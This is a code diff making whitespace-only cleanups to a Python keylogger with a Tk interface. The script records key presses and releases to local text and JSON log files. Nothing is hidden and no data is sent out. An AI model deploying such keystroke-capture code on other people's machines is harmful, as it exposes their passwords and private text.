@@ -10,7 +10,6 @@ from datetime import datetime
 
 from json import dumps as _dumps
 
-
 keys_used: list = []
 flag: bool = False
 keys: str = ""
@@ -24,7 +23,7 @@ def generate_text_log(key: _Any) -> None:
     Args:
         key (Any): The keystroke data to write into the log file.
     """
-    
+
     with open("./out/key_log.txt", "w+") as KEYS:
         KEYS.write(key)
 
@@ -36,7 +35,7 @@ def generate_json_file(used_keys: _Any) -> None:
     Args:
         used_keys (Any): A list of key events to log in JSON format.
     """
-    
+
     with open("./out/key_log.json", "+wb") as key_log:
         key_list_bytes = _dumps(used_keys).encode()
         key_log.write(key_list_bytes)
@@ -49,7 +48,7 @@ def on_press(key: _Any) -> None:
     Args:
         key (Any): The key that was pressed.
     """
-    
+
     global flag, keys_used, keys
     if not flag:
         keys_used.append({"Pressed": f"{key}"})
@@ -67,7 +66,7 @@ def on_release(key: _Any) -> None:
     Args:
         key (Any): The key that was released.
     """
-    
+
     global flag, keys_used, keys
     keys_used.append({"Released": f"{key}"})
 
@@ -101,7 +100,6 @@ def stop_keylogger():
     Stops the keylogger, halting keystroke logging.
     """
 
-
     listener = _LISTENER
     listener.stop()
     label.config(text="Keylogger stopped.")
@@ -110,7 +108,6 @@ def stop_keylogger():
 
 
 if __name__ == "__main__":
-
     root = _Tk()
     root.title("Keylogger")
 
